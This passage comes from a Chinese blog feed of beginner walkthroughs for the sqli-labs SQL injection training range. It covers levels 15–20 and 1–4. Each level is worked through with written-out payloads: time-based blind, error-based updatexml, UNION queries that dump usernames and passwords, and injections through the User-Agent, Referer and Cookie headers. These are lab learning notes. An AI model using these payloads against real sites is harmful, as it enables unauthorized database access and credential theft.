comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>判断表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='</span>r' <span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>limit一个一个查出我想要的表名，</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(left((select column_name from information_schema.columns where table_name='</span>users<span class="token string">' limit 4,1),8)='</span>password' <span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430230739842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断列名</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(left((select password from users order by id limit 0,1),4)='</span>dumb' <span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>爆值</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(left((select username from users order by id limit 0,1),4)='</span>dumb' <span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>又是没有回显，所以时间型盲注，要做的就是判断闭合符号。其他的都与上一关一样。<br><img src="https://img-blog.csdnimg.cn/20200430231029551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断完毕，是<code>&quot;)</code>闭合。<br>其他不再重复。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>好像是没见过的，emmmmm，然后看了眼标题，(基于错误的更新查询POST注入)，报错注入。反斜扛也没有回显。我试了盲注<br><img src="https://img-blog.csdnimg.cn/20200430231236411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>好像没有思路了。<br>这一关还是跟着大佬的博客来学习吧。<br>看下源码，然而，就能看懂几句。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// truncation (see comments)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Stripslashes if magic quotes enabled</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Quote if not a number</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"'"</span> <span class="token punctuation">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这个看了大佬的博客</p><blockquote><p>只截取15个字符<br>get_magic_quotes_gpc()<br>当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1<br>当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0<br>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。<br>在magic_quotes_gpc = On的情况下，如果输入的数据有<br>单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。<br>stripslashes()删除由 addslashes() 函数添加的反斜杠<br>ctype_digit()判断是不是数字，是数字就返回true，否则返回false<br>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。<br>intval()     整型转换</p></blockquote><p>不好意思抄，还是把大佬的博客放这里——&gt;<a href="https://blog.csdn.net/qq_41420747/article/details/81836327#Less-17%20POST%20-%20Update%20Query-%20Error%20Based%20-%20String%20%28%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%9B%B4%E6%96%B0%E6%9F%A5%E8%AF%A2POST%E6%B3%A8%E5%85%A5%29">关于Less-17关</a><br>这个是对uname进行了一大堆过滤，反而password没有做什么措施所以可以从第二个框里入手插SQL语句。<br>试一下，是对的。<br><img src="https://img-blog.csdnimg.cn/20200430231516225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>但是他这个要考验的内容是什么？？我感觉应该是多方面考虑，不要将思维固化，尝试换个角度思考问题可能会有意想不到的结果。<br>其他的不再重复。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p><img src="https://img-blog.csdnimg.cn/20200430231559611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>一上来给我个IP什么意思？靶场是搭建在虚拟机上的。看一下那个标题。<br>(header injection Uagent)<br>一看这个我就明白了，哈。我之前看过这个，前几天看过两个关于注入的注入点比较不平常的，没想到在靶场会有。哈，正好练练手。我这个还记笔记了，在印象笔记上，先搬过来再说</p><pre class="language-bash" data-language="bash"><code class="language-bash">HTTP中User-Agent注入<span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO'security'.'uagents'('uagent','ip_address','username') VALUES ('<span class="token variable">$uagent</span>','<span class="token variable">$IP</span>',<span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span>payload内容updatexml<span class="token punctuation">(</span>xml_document,xpath_string,new_value<span class="token punctuation">)</span><span class="token punctuation">;</span>第一个参数：XML文档对象名称。//可以用数字代替第二个参数：XPath字符串。第三个参数：替换查找到的符合条件的数据。<span class="token string">' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>      //查询当前版本信息<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>   //查询当前数据库名。其他以此类推。</code></pre><p>因为这个唯一跟之前不同的就是它的注入点变了，语句什么的还是老样子。先抓包看一下。，抓到了，要插入SQL语句就在这个地方插入就可以。<br><img src="https://img-blog.csdnimg.cn/20200430231756796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>先看看当前版本信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430231917788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>版本信息出来了，这个时候就证明是可行的，所以直接构造得出数据库名的payload就可以了。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430232021967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>下面就很正常了，按照报错注入的程序来走就行了。不再重复。</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>我看了标题，emmmm，是在Referer处进行注入，</p><blockquote><p>HTTP Referer注入<br>‘ or ‘1’=’1      //查询是否存在注入<br>‘ or (length(database()))&gt;8 or if(1=1,sleep(5),null) or ‘1’=’1    //通过一个一个查询信息得到我们想要的结果。过程繁杂。</p></blockquote><p>emmm这个也是我的笔记，我的笔记当时记录的时候是以一个基于盲注的注入例题来记录的，当然这里有回显，就不是盲注。反而变得简单了点。<br>可以看出这个是在Referer处插入语句，但是比较复杂。<br>看一下，当然是先抓包，<br><img src="https://img-blog.csdnimg.cn/20200430232159587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>在这里插入SQL语句<br>先判断是否存在注入，<code>&#39; or &#39;1&#39;=&#39;1</code><br>有点多余哈，(在这里)，不过在实战中还是需要这一步。<br>然后可以构造查询语句来得到我们想要的结果。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430232253508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>没有什么其他的新的知识点，不再重复。</p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>先试一下，还是老样子，全输入admin，然后看。<br>我透？这啥鬼东西，cookie都整出来了。<br><img src="https://img-blog.csdnimg.cn/20200430232355966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>不过，想想前两关的套路，这个难道是在cookie处进行注入吗？<br>试试。我透！！为啥跟刚才不一样了，同样是输入的admin啊，再说了，这在哪插？？(我tm直接懵逼.jpg)<br><img src="https://img-blog.csdnimg.cn/20200430232500979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>再想想，我刚好想进行了一个不为人知的操作，就是下面这个<br><img src="https://img-blog.csdnimg.cn/20200430232602379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>我明白了，他会变样是因为我把cookie删了，然后浏览器就没有完成一系列的流程，所以在burp里显示不出来，这次我不删了，直接刷新，<br><img src="https://img-blog.csdnimg.cn/20200430232652358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>嘿嘿，找到了，在这里注入就好啦，<br>这个详细记录一下：</p><h3 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h3><p>先判断闭合符号，加个单引号试试，发现有报错，那就是单引号闭合了。<br><img src="https://img-blog.csdnimg.cn/20200430232804497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断列数payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430232901328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后到4就回显错误了</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430232945586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后爆数据库payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430233041203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>联合查询的特点不能忘了，要将前面的<code>uname=-admin</code>，这个要构造成错的。然后继续的话，跟第一关一样了，没什么要注意的了。</p><h3 id="第二种方法：报错注入"><a href="#第二种方法：报错注入" class="headerlink" title="第二种方法：报错注入"></a>第二种方法：报错注入</h3><p>已知单引号闭合，所以直接使用报错注入常用函数进行查询数据库名<br>查询数据库名构造payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430233121588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>都是一个样子，做了这二十关的题，收获很多，不过毕竟手注太费劲了，费时费力，要学使用工具了，python脚本不会写，可以使用工具，sqlmap是个不错的选择，就搞它。下次再学习SQL注入就要进行sqlmap的学习了，前段时间多少了解了一点，现在只会用sqlmap进行第一关的爆破，其他的注入也见过，知道方法但是没有实践，还是回头再细学一下再说吧。</p><p>文末寄语：<br>这世上多一个人笑，就少一个人哭。——《煎饼侠》</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs闯关1-4</title>
      <link href="/posts/53628932/"/>
      <url>/posts/53628932/</url>
      
        <content type="html"><![CDATA[<h4 id="The-first"><a href="#The-first" class="headerlink" title="The first"></a>The first</h4><p>第一步：判断闭合符号，输入单引号，看看是否报错，这里就报错了，当然注释符有好多种（<code>&#39;</code>、<code>&quot;</code>、<code>#</code>、<code>--+</code>）这里输入单引号就行了，报错了。<br>根据报错信息，可以确定输入参数的内容被存放到一对单引号中间。这里我很迷，到了第二关，也是报错，先不说，就是有没有人懵逼这个报错怎么看是不是需要单引号？？是什么类型的注入？？？和我一样的新手看到这里不懂请自动忽略，等到第二关再回来看，就会明白了，这个依据就是：你仔细看第一关和第二关的第一步报错对比一下，认真看，看看是不是第一张图片那个LIMIT前面那个1两边是有双引号的，第二张图就没有。仔细品😎😎😎<br>输入：</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>'</code></pre><p><img src="https://img-blog.csdnimg.cn/2020022722143253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>第二步：判断列数用order by语句<br>输入：</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>' order by <span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200227223713890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后把1换成2，再换成3，判断下去，直到报错为止。依次判断，这里是到4，报错。<br><img src="https://img-blog.csdnimg.cn/20200227224012265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>（附图作参考，如果没有出现这个页面，那么就是SQL语句输入错误，检查语句。）<br>第三步：联合注入爆数据库令 <strong>id=非正确值</strong>,这里我使id=0。<br>至于为什么？哪有呢么多为什么、我也不知道，hhh🤣🤣🤣</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200227225857611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里，database()放在2或者3的位置都可以，注意，如果放在2的位置上的话，后面的3不能丢，这个错误很容易犯，所以，我就放在3的位置上，这样也不会忘。😂😂<br>第四步：爆数据表</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>security' <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200227230738159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>显然users是用户数据表，为什么？单词告诉我的，那三个像吗？就算猜也要给我猜这个！😎😎😎<br>第五步：爆字段</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>看到了，那么大的username，password😁😁<img src="https://img-blog.csdnimg.cn/20200227231443749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最最最后一步了，爆值：</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>0x3a意思是“<code>:</code>”<br><img src="https://img-blog.csdnimg.cn/20200227232220458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这都是哈哈哈，恭喜通关！✌✌✌✌</p><h4 id="The-second"><a href="#The-second" class="headerlink" title="The second"></a>The second</h4><p>第一步：还是先判断有无闭合符号，然后输入<code>?id=1&#39;</code><br><img src="https://img-blog.csdnimg.cn/20200227233231504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>根据报错信息确定输入的内容被带入到数据库中，也可叫做数字型注入。懵逼了没，为什么？怎么看出来的？跟第一关有什么不同？再回过头去看看文章开头第一关那里能不能看出来就靠自己了，反正我是看懂了，hhh<br>跟第一关的步骤一样，只是，不再需要这个<code>&#39;</code>单引号了。<br>就不再重复了，我把结果放出来吧，证明是可行的。😜😜😜<br><img src="https://img-blog.csdnimg.cn/20200228000749246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="The-third"><a href="#The-third" class="headerlink" title="The third"></a>The third</h4><p>第三关和前面一样，只是闭合符号又不一样这次的是,,,,看圆括号<br><img src="https://img-blog.csdnimg.cn/2020022800200438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好了，其他还是跟上面一样，不说了，太困了，啊啊！睡觉，，今天又熬夜了，心疼我的头发，害！！对了，留一张图，证明我来过。。。。。<br><img src="https://img-blog.csdnimg.cn/20200228002342974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>晚安，来不及回首说拜拜。</p><html ><hr> </html><p>上面是一条华丽的分界线,进行下一关</p><h4 id="The-fourth"><a href="#The-fourth" class="headerlink" title="The fourth"></a>The fourth</h4><p>第一步仍然是判断闭合符号，先判断单引号<br><img src="https://img-blog.csdnimg.cn/20200229164259624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>没有报错。那就不是，再试双引号<br><img src="https://img-blog.csdnimg.cn/20200229164502713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"><br>报错，根据报错信息判断出输入的内容被放到一对双引号和圆括号中啦。<br>接下来就该判断列数，</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> order by <span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>还是到4报错了，<br><img src="https://img-blog.csdnimg.cn/20200229165132883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>到这里，不判断他的数据库名来试试，直接爆表名，（我看其他博主的博客有这么做的，我也来试试，省去爆库的步骤了）</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span>"<span class="token punctuation">)</span> union select <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200229171425981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哇！真的可以。<br><img src="https://img-blog.csdnimg.cn/20200229165641717.gif" alt="在这里插入图片描述" loading="lazy"><br>解释一下哈，刚没有爆库名，所以我不知道在哪个库里面，然后，我把语句改成这样啦<code>where table_schema=database()</code>就是从table_schema=database(),这个库里直接爆表，也是可以的。目前刚了解到，还是先老老实实的爆先爆库名。<br>继续继续hhh，爆列：</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span>"<span class="token punctuation">)</span> union select <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>跟前几关一样了<br><img 